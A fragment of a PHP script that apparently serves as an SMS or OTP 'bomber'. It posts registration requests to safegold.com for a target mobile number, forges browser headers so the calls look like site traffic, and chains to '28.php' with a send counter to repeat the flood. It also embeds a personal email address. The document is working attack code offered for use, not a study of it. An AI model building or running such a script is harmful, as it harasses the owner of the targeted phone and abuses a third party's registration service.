...
if($sent==$count){	
 ...
 $data='{"enable_whatsapp":true,"is_check":true,"name":"unknown","mobile_no":"'.$mobno.'","email":"gotothedshah98@gmail.com"}';
 $url="https://www.safegold.com/register";
         //header here
        $headers   = array();
        $headers[] = "Host:www.safegold.com";
        ...
        $headers[] = "origin:https://www.safegold.com";
       
       // $headers[] = "";
        $headers[] = "Sec-Fetch-Site:same-site";
        $headers[] = "Sec-Fetch-Mode:cors";
        $headers[] = "Sec-Fetch-Dest:empty";
        $headers[] = "referer:https://www.safegold.com/";
	...
	$sentinc=$sent+1;
   $rl="28.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
